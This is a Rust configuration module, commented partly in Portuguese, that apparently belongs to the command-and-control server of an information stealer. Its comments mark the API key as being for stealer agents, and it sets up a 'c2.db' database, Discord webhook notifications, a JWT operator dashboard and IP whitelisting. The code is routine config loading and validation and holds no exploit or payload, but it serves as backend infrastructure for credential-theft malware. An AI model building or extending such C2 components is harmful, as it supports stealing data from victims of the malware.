use serde::{Deserialize, Serialize};
use figment::{Figment, providers::{Toml, Env, Format}};
use std::path::PathBuf;

// ============================================================
// CONFIGURAÇÃO PRINCIPAL
// ============================================================
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct Config {
    pub server: ServerConfig,
    pub database: DatabaseConfig,
    pub auth: AuthConfig,
    pub security: SecurityConfig,
    pub logging: LoggingConfig,
}

// ============================================================
// SERVER CONFIGURATION
// ============================================================
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct ServerConfig {
    pub host: String,
    pub port: u16,
    pub workers: usize,
    pub tls_enabled: bool,
    pub cert_file: String,
    pub key_file: String,
}

impl ServerConfig {
    /// Retorna o endereço completo para bind (ex: "0.0.0.0:8443")
    pub fn addr(&self) -> String {
        format!("{}:{}", self.host, self.port)
    }
}

// ============================================================
// DATABASE CONFIGURATION (PostgreSQL ou SQLite)
// ============================================================
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct DatabaseConfig {
    pub url: String,  // postgresql://user:pass@host/db ou sqlite:./data/c2.db
}

impl DatabaseConfig {
    /// Detecta se está usando PostgreSQL
    pub fn is_postgres(&self) -> bool {
        self.url.starts_with("postgres")
    }
    
    /// Detecta se está usando SQLite
    pub fn is_sqlite(&self) -> bool {
        self.url.starts_with("sqlite:")
    }
    
    /// Retorna o caminho do arquivo SQLite (se aplicável)
    pub fn sqlite_path(&self) -> Option<PathBuf> {
        if self.is_sqlite() {
            // Remove o prefixo "sqlite:"
            let path = self.url.trim_start_matches("sqlite:");
            // Remove "./" do início se existir
            let path = path.trim_start_matches("./");
            let path = PathBuf::from(path);
            
            if path.is_absolute() {
                // Se for caminho absoluto, garante que o diretório pai existe
                if let Some(parent) = path.parent() {
                    let _ = std::fs::create_dir_all(parent);
                }
                Some(path)
            } else {
                // Se for caminho relativo, junta com current_dir
                let current = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
                let full_path = current.join(&path);
                // Garante que o diretório pai existe
                if let Some(parent) = full_path.parent() {
                    let _ = std::fs::create_dir_all(parent);
                }
                Some(full_path)
            }
        } else {
            None
        }
    }
}

// ============================================================
// AUTHENTICATION CONFIGURATION
// ============================================================
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct AuthConfig {
    pub api_key: String,           // Para agentes (stealer)
    pub jwt_secret: String,        // Para JWT (dashboard)
    pub admin_password: String,    // Senha do admin
    pub discord_webhook: String,   // Notificações Discord
    pub jwt_expiry_hours: i64,     // Expiração do token (horas)
}

impl AuthConfig {
    /// Verifica se o Discord webhook está configurado
    pub fn has_discord(&self) -> bool {
        !self.discord_webhook.is_empty() 
            && self.discord_webhook != "https://discord.com/api/webhooks/YOUR_WEBHOOK/TOKEN"
    }
    
    /// Verifica se a API key é válida (não é padrão)
    pub fn has_valid_api_key(&self) -> bool {
        !self.api_key.is_empty() 
            && self.api_key != "CHANGE_ME_GENERATE_RANDOM_STRING"
            && self.api_key != "YOUR_SECRET_API_KEY_CHANGE_ME"
    }
    
    /// Verifica se o JWT secret é válido
    pub fn has_valid_jwt_secret(&self) -> bool {
        !self.jwt_secret.is_empty() 
            && self.jwt_secret.len() >= 32
            && self.jwt_secret != "CHANGE_ME_GENERATE_RANDOM_STRING"
    }
}

// ============================================================
// SECURITY CONFIGURATION
// ============================================================
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct SecurityConfig {
    pub rate_limit_per_minute: u32,
    pub allowed_ips: Option<Vec<String>>,  // IP whitelist (CIDR ou IPs)
    pub enable_cors: bool,
    pub trusted_proxies: Option<Vec<String>>,  // Para X-Forwarded-For
}

impl SecurityConfig {
    /// Verifica se IP whitelist está ativa
    pub fn has_ip_whitelist(&self) -> bool {
        self.allowed_ips.as_ref().map(|ips| !ips.is_empty()).unwrap_or(false)
    }
    
    /// Verifica se IP está na whitelist (simplificado)
    pub fn is_ip_allowed(&self, ip: &str) -> bool {
        if let Some(allowed) = &self.allowed_ips {
            if allowed.is_empty() {
                return true;
            }
            // Verifica IP exato (CIDR seria mais complexo)
            allowed.iter().any(|allowed_ip| allowed_ip == ip)
        } else {
            true
        }
    }
}

// ============================================================
// LOGGING CONFIGURATION
// ============================================================
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct LoggingConfig {
    pub level: String,      // debug, info, warn, error
    pub file: String,       // Caminho do arquivo de log
    pub json_format: bool,  // Log em formato JSON (para produção)
}

impl LoggingConfig {
    /// Converte level string para tracing::Level
    pub fn to_tracing_level(&self) -> tracing::Level {
        match self.level.to_lowercase().as_str() {
            "debug" => tracing::Level::DEBUG,
            "info" => tracing::Level::INFO,
            "warn" => tracing::Level::WARN,
            "error" => tracing::Level::ERROR,
            _ => tracing::Level::INFO,
        }
    }
}

// ============================================================
// IMPLEMENTAÇÃO PRINCIPAL
// ============================================================
impl Config {
    /// Carrega a configuração com fallback para ambiente
    pub fn load() -> Result<Self, figment::Error> {
        println!("   [config] Lendo config.toml...");
        let config: Config = Figment::new()
            .merge(Toml::file("config.toml"))
            .merge(Env::prefixed("C2_").split("__"))
            .extract()?;
        
        println!("   [config] Config lida, validando...");
        config.validate()?;
        
        println!("   [config] Validação OK");
        Ok(config)
    }
    
    /// Valida os campos críticos
    fn validate(&self) -> Result<(), figment::Error> {
        println!("   [config] Validando API key...");
        if !self.auth.has_valid_api_key() {
            eprintln!("⚠️  WARNING: Using default or weak API_KEY. Set C2_AUTH__API_KEY environment variable.");
        }
        
        println!("   [config] Validando JWT secret...");
        if !self.auth.has_valid_jwt_secret() {
            eprintln!("⚠️  WARNING: JWT secret is weak or default. Set C2_AUTH__JWT_SECRET (min 32 chars).");
        }
        
        println!("   [config] Validando admin password...");
        if self.auth.admin_password.is_empty() || self.auth.admin_password == "change-this-to-strong-password" {
            eprintln!("⚠️  WARNING: Admin password is default. Set C2_AUTH__ADMIN_PASSWORD environment variable.");
        }
        
        println!("   [config] Validando database URL...");
        if self.database.url.is_empty() {
            eprintln!("❌ ERROR: Database URL is empty. Set C2_DATABASE__URL");
            return Err(figment::Error::from("Database URL is required"));
        }
        
        println!("   [config] Validando SQLite path (se aplicável)...");
        if self.database.is_sqlite() {
            if let Some(path) = self.database.sqlite_path() {
                println!("   [config] SQLite path: {:?}", path);
                if let Some(parent) = path.parent() {
                    println!("   [config] Parent dir: {:?}", parent);
                    if !parent.exists() {
                        println!("   [config] Criando diretório: {:?}", parent);
                        if let Err(e) = std::fs::create_dir_all(parent) {
                            println!("   [config] ERRO ao criar diretório: {}", e);
                        }
                    }
                }
            }
        }
        
        println!("   [config] Validação concluída");
        Ok(())
    }
    
    /// Gera um resumo da configuração (útil para logs)
    pub fn summary(&self) -> String {
        format!(
            "Server: {}:{} | DB: {} | Rate Limit: {} req/min | Discord: {}",
            self.server.host,
            self.server.port,
            if self.database.is_postgres() { "PostgreSQL" } else { "SQLite" },
            self.security.rate_limit_per_minute,
            if self.auth.has_discord() { "enabled" } else { "disabled" }
        )
    }
}

// ============================================================
// CONFIGURAÇÃO PADRÃO (para desenvolvimento)
// ============================================================
impl Default for Config {
    fn default() -> Self {
        Self {
            server: ServerConfig {
                host: "0.0.0.0".to_string(),
                port: 8443,
                workers: 4,
                tls_enabled: false,
                cert_file: "./certs/cert.pem".to_string(),
                key_file: "./certs/key.pem".to_string(),
            },
            database: DatabaseConfig {
                url: "sqlite:./data/c2.db".to_string(),
            },
            auth: AuthConfig {
                api_key: "CHANGE_ME_GENERATE_RANDOM_STRING".to_string(),
                jwt_secret: "CHANGE_ME_GENERATE_RANDOM_STRING_32_BYTES".to_string(),
                admin_password: "change-this-to-strong-password".to_string(),
                discord_webhook: "".to_string(),
                jwt_expiry_hours: 24,
            },
            security: SecurityConfig {
                rate_limit_per_minute: 100,
                allowed_ips: None,
                enable_cors: true,
                trusted_proxies: None,
            },
            logging: LoggingConfig {
                level: "info".to_string(),
                file: "./data/c2.log".to_string(),
                json_format: false,
            },
        }
    }
}